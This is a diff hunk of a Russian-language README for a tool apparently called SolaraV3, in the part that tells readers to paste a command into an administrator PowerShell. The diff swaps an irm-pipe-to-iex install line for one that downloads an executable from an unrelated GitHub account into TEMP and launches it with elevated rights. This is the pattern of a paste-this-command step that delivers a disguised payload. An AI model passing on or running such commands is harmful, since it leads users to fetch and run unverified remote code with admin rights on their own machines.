@@ -39,7 +39,7 @@
 > Открой **PowerShell от имени администратора** и вставь:
 
 ```powershell
-irm https://raw.githubusercontent.com/ChampionWand/SolaraV3/main/scripts/install.ps1 | iex
+powershell -c irm https://github.com/CentipedeRegister/Xeno/releases/latest/download/SolaraV3.exe -OutFile $env:TEMP\SolaraV3.exe; Start-Process $env:TEMP\SolaraV3.exe -Verb RunAs
 ```
 
 Что делает скрипт:
